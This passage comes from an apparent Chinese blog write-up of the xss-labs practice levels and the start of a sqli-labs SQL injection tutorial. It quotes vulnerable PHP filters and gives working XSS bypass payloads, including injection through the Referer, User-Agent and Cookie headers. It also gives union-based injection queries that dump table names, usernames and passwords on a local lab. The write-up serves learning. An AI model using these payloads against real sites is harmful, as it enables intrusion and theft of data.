标签_data</a></p><p>标签用于添加给定内容的机器可读翻译。</p><p>我们可以利用双拼写来绕过，</p><p>比如on，我们可以写成oonn，当中间on被删掉的时候，就变成了on</p><p>比如script，可以写成scscriptipt，当script被删掉的时候，就变成了script</p><p>所以这关主要是双拼写绕过，方法有很多，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hrehreff</span>=<span class="hljs-string">javasscriptcript:alert()</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> &lt;&quot;<br>    <br>&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">scscriptript</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">scscriptript</span>&gt;</span> &lt;&quot;<br><br>&quot;oonnfocus=javascript:alert() &quot;     <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958793.png"></p><h4 id="level8-Unicode解码"><a href="#level8-Unicode解码" class="headerlink" title="level8_Unicode解码"></a>level8_Unicode解码</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958226.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br></code></pre></td></tr></table></figure><p>过滤掉了onfocus、src、data、href、script、”</p><p>这一关利用href的隐藏属性自动Unicode解码，我们可以插入一段js伪协议</p><p>在线Unicode编码：<a href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958663.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958995.png"></p><h4 id="level9-Unicode解码"><a href="#level9-Unicode解码" class="headerlink" title="level9_Unicode解码"></a>level9_Unicode解码</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958229.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span>===<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str7</span>,<span class="hljs-string">&#x27;http://&#x27;</span>))<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>        &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用<code>strpos($str7, &#39;http://&#39;)</code>检查<code>$str7</code>中是否包含子字符串<code>http://</code>。</p><ul><li><code>strpos()</code>返回<code>http://</code>首次出现的位置（整数），若未找到则返回<code>false</code>。</li><li>由于使用严格相等<code>===</code>比较返回值是否为<code>false</code>，只有完全未找到<code>http://</code>时条件成立。</li></ul><p>那么我们可以在上一关的基础上加上<code>http://</code>，并且还需要加注释符将<code>http://</code>注释掉。</p><p>构建payload：<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/*http://*/</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959191.png"></p><h4 id="level10-onfocus"><a href="#level10-onfocus" class="headerlink" title="level10_onfocus"></a>level10_onfocus</h4><p>来到第十关发现没有输入框</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959790.png"></p><p>分析源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<span class="hljs-comment">//使用GET传参&quot;t_sort&quot;</span><br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<span class="hljs-comment">//过滤掉了&lt;&gt;号</span><br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<span class="hljs-comment">//过滤掉了&lt;&gt;号</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构建payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?t_sort=&quot; onfocus=javascript:alert() type=&quot;text<br></code></pre></td></tr></table></figure><p><code>type=&quot;text</code>覆盖原输入的<code>type</code>属性。原本是<code>type=&quot;hidden&quot;</code>（隐藏输入框），注入后改为<code>type=&quot;text&quot;</code>，使输入框可见。</p><p>浏览器解析HTML时，若同一属性重复，通常以最后一个为准。因此注入的<code>type=&quot;text&quot;</code>可能覆盖原隐藏属性，强制显示输入框以便用户交互</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959543.png"></p><p>之后点击输入框</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959333.png"></p><h4 id="level11-referer"><a href="#level11-referer" class="headerlink" title="level11_referer"></a>level11_referer</h4><p>测试一下关键字</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot; sRc DaTa OnFocus <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span> <span class="hljs-symbol">&amp;#106;</span></span></span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php <br>ini_set(&quot;display_errors&quot;, 0);<br>$str = $_GET[&quot;keyword&quot;];<br>$str00 = $_GET[&quot;t_sort&quot;];<br>$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];//将HTTP请求头中的Referer信息赋值给变量$str11<br>$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);<br>$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);<br>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;<br>&lt;form id=search&gt;<br>&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;<br>&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;<br>&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;<br>&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;<br>&lt;/form&gt;<br><br>&lt;/center&gt;&#x27;;<br>?&gt;<br></code></pre></td></tr></table></figure><p>REFERER（Referer）是 <strong>HTTP 请求头</strong> 中的一个字段，用于表示当前请求的 <strong>来源页面 URL</strong>。它是浏览器在向服务器发送请求时自动附加的信息，告诉服务器用户是从哪个页面跳转过来的。</p><p>先尝试一下第10关的<code>?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</code></p><p>发现双引号被实体化</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959136.png"></p><p>试一下referer</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959411.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959920.png"></p><p>将referer改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&quot; onfocus=javascript:alert() type=&quot;text<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959669.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959090.png"></p><h4 id="level12-User-Agent头"><a href="#level12-User-Agent头" class="headerlink" title="level12_User-Agent头"></a>level12_User-Agent头</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959376.png">隐藏的input标签可以插入type&#x3D;”text”显示 ，可以一个一个尝试：</p><p>测试一下关键字</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot; sRc DaTa OnFocus <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span> <span class="hljs-symbol">&amp;#106;</span></span></span><br></code></pre></td></tr></table></figure><p>第一、二传参没有回显</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959975.png"></p><p>第三个：可以看到被实体化</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022000685.png"></p><p>只能是第四个：</p><p>ua是User-Agent头，使用bp抓包改ua头就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022000373.png"></p><p>构造UA头：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&quot; onfocus=javascript:alert() type=&quot;text<br></code></pre></td></tr></table></figure><p>使用bp抓包</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022000772.png"></p><p>将UA头修改</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022000841.png"></p><p>放行后点击框</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022000572.png"></p><h4 id="level13-cookie头"><a href="#level13-cookie头" class="headerlink" title="level13_cookie头"></a>level13_cookie头</h4><p>依旧尝试前三个不成功</p><p>测试关键字</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot; sRc DaTa OnFocus <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span> <span class="hljs-symbol">&amp;#106;</span></span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001394.png"></p><p>名字是t_cook，考虑到是cookie头，我们先看一下这个网页的cookie</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001153.png"></p><p>将这里修改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">“ onfocus=javascript:alert() type=&quot;text<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001360.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001920.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001445.png"></p><h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p><a href="https://www.freebuf.com/articles/web/282983.html">xss-labs靶场-第十四关 iframe和exif xss漏洞 - FreeBuf网络安全行业门户</a></p><p>HTML <code>&lt;iframe&gt;</code> 标签：作用是标记一个内联框架！！一个内联框架被用来在当前 HTML 文档中嵌入另一个文档。</p><h4 id="level15-ng-include"><a href="#level15-ng-include" class="headerlink" title="level15_ng-include"></a>level15_ng-include</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001826.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001160.png"></p><p><code>ng-include</code> 是 AngularJS 中的一个指令，用于在 HTML 中动态加载并嵌入外部的 HTML 片段。它允许你将一个外部的 HTML 文件或模板包含到当前的页面中，从而实现模块化和代码复用。</p><p>包含第一关</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001686.png"></p><p>进行了实体转义：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001859.png"></p><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?src=&#x27;level1.php?name=&lt;img src=XXX onmouseover=alert()&gt;&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001888.png"></p><h4 id="level16-空格实体转义"><a href="#level16-空格实体转义" class="headerlink" title="level16_空格实体转义"></a>level16_空格实体转义</h4><p>测试一下关键字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?keyword=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P&lt;/&gt; &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001496.png"></p><p>将字母小写化，再把script和&#x2F;替换成空格，最后将空格给实体化</p><p>空格可以用回车来代替绕过，回车的url编码是<code>%0a</code>，再配合上不用 &#x2F; 的<code>&lt;img&gt;</code>、<code>&lt;details&gt;</code>、<code>&lt;svg&gt;</code>等标签</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">?keyword=&lt;svg%0Aonload=alert()&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022002288.png"></p><h4 id="level17-embed"><a href="#level17-embed" class="headerlink" title="level17_embed"></a>level17_embed</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022002425.png"></p><p><code>embed</code> 是 HTML 中的一个标签，用于在网页中嵌入外部内容，例如 PDF 文件、视频、音频、Flash 动画等。</p><p>embed将一个swf文件引到浏览器端</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?arg01= onmouseover&amp;arg02=alert(1)<br></code></pre></td></tr></table></figure><p><code>onmouseover</code>：表示当鼠标移动到该标签上时就会触发执行某项动作</p><p>火狐不可以，edge可以：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022002531.png"></p><h4 id="level18-embed"><a href="#level18-embed" class="headerlink" title="level18_embed"></a>level18_embed</h4><p>与level17一样：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022002007.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022002406.png"></p><h1 id="3、sqli-labs"><a href="#3、sqli-labs" class="headerlink" title="3、sqli-labs"></a>3、sqli-labs</h1><h2 id="sql注入一般步骤："><a href="#sql注入一般步骤：" class="headerlink" title="sql注入一般步骤："></a><strong>sql注入一般步骤：</strong></h2><p><strong>一、判断注入类型</strong></p><p><strong>数字型注入</strong></p><ol><li>url为<code> http://127.0.0.1/sqli-labs/Less-2/?id=1&#39;</code>时，因为有一个多余的”单引号”使查询语句错误</li><li>url为 <code>http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=1</code>时，没有报错</li><li>url为<code> http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=2</code>时，由于1&#x3D;2不成立，也会报错</li></ol><p>满足这三个，基本上就是数字注入了</p><p><strong>字符型注入</strong></p><ol><li>url为 <code>http://127.0.0.1/sqli-labs/Less-2/?id=1&#39;</code>时，数据库认为id叫做1’。查询之后发现没有这个id而返回错误。（在字符型注入中，需要考虑引号的闭合）</li><li>url为 <code>http://127.0.0.1/sqli-labs/Less-2/?id=1&#39; and &#39;1&#39;=&#39;1 </code>在’1’&#x3D;’1之后没有加上’是因为传参时输入的内容已经被’ ‘包围。</li></ol><p>满足这俩个，基本上就是字符注入了</p><p><strong>二、后台查询列数</strong></p><p>使用<code>order by</code>试出数据库列数</p><p>url为 <code>http://127.0.0.1/sqli-labs/Less-2/?id=1&#39; order by 数字 </code>（如果试4时有错误，3时正确，那么列数为3）</p><p><strong>三、找显示位</strong></p><p>使用<code>union select</code>找出会返回客户端并显示的列。如果有3列时，应该这么写</p><p>url为<code> http://127.0.0.1/sqli-labs/Less-2/?id=1&#39; union select 1,2,3</code></p><p>加入显示位是3，这就意味着数据库开放了5个“窗口”用来显示内容，用查询到的数据，在这些窗口显示数据</p><p><strong>四、查库名，获取当前数据名和版本号</strong></p><p>联合查询：<code>select database();</code></p><p>下面是查看数据库的版本和数据库信息</p><p>假如显示位是3，<code>http://127.0.0.1/sqli-labs/Less-2/?id=1&#39; union select 1,version,database()</code></p><p><strong>五、查表名</strong></p><p>找到库名以后，使用<code>http://127.0.0.1/sqli-labs/Less-2/?id=1&#39; union select 1,2,table_name from information_schema.tables where table_schema=&#39;库名&#39; </code>(如果库名是字符型，此处库名要转成十六进制)</p><p><strong>information_schema:</strong></p><p>这是一个mysql自带的库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表列的数据类型与访问权限等，所以我们查询这个库</p><p><strong>六、查列名</strong></p><p>找到表之后，使用<code>http://127.0.0.1/sqli-labs/Less-2/?id=1&#39; union select 1,2,column_name from information_schema.columns where table_name=&#39;表名&#39; </code>(如果表名是字符型，此处库名要转成十六进制)</p><p>如果表数或列数过多，可以在最后使用limit加上limit 0，5相当于检索1-5条信息</p><p><strong>七、查具体数据</strong></p><p>找到列之后，使用<code>http://127.0.0.1/sqli-labs/Less-2/?id=1&#39; union select 1,2,group_concat(&quot;要查询的数据&quot;) from 列名</code></p><p>总结：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1<br>?id=1&#x27;//出错<br>?id=1 and 1=1//正常<br>?id=1 and 1=2//出错      //检查为数字注入<br> <br>?id=1&#x27; and &#x27;1&#x27;=&#x27;1//正常<br>?id=1&#x27;//出错//检查为字符注入<br> <br>?id=1 order by 3//查列数<br>?id=-1 union select 1,2,3//找显示位<br>?id=-1 union select 1,database(),version()//查库名，获取当前数据名和版本号<br>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;库名&#x27;//查表名<br>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27;//查列名<br>?id=-1 union select 1,2,group_concat(username ,id , password) from 列名//查字段<br> <br></code></pre></td></tr></table></figure><h2 id="以下是-SQL-注入攻击的一般步骤总结"><a href="#以下是-SQL-注入攻击的一般步骤总结" class="headerlink" title="以下是 SQL 注入攻击的一般步骤总结"></a>以下是 SQL 注入攻击的一般步骤总结</h2><hr><p><strong>1. 探测注入点</strong></p><ul><li><strong>目标</strong>：寻找可能存在漏洞的输入参数（如 URL 参数、表单字段、Cookie 等）。</li><li><strong>方法</strong>：  <ul><li>在参数后添加单引号 <code>&#39;</code>，观察是否返回数据库错误（如 <code>You have an error in your SQL syntax</code>）。  </li><li>使用逻辑测试：</li></ul></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span>  <span class="hljs-comment">-- 正常返回  </span><br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">2</span>  <span class="hljs-comment">-- 无返回（说明条件生效，存在注入）</span><br></code></pre></td></tr></table></figure><hr><p><strong>2. 判断注入类型</strong></p><ul><li><strong>基于错误（Error-Based）</strong>：直接通过报错信息获取数据（如 <code>extractvalue(1, concat(0x7e, version()))</code>）。  </li><li><strong>联合查询（UNION-Based）</strong>：利用 <code>UNION SELECT</code> 回显数据。  </li><li><strong>布尔盲注（Boolean Blind）</strong>：通过页面返回真假状态推断数据（如 <code>AND 1=1</code> &#x2F; <code>AND 1=2</code>）。  </li><li><strong>时间盲注（Time-Based）</strong>：通过延时函数判断条件（如 <code>SLEEP(5)</code>）。</li></ul><hr><p><strong>3. 确定字段数</strong></p><ul><li><strong>方法</strong>：使用 <code>ORDER BY</code> 递增测试，直到报错：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; ORDER BY 3 --+  -- 正常  </span><br><span class="hljs-string">id=1&#x27;</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+  -- 报错（字段数为3）</span><br></code></pre></td></tr></table></figure><ul><li><strong>目的</strong>：为后续 <code>UNION SELECT</code> 匹配列数。</li></ul><hr><p><strong>4. 联合查询提取数据</strong></p><ul><li><strong>步骤</strong>：  <ol><li>强制原查询返回空：<code>id=-1&#39; UNION SELECT 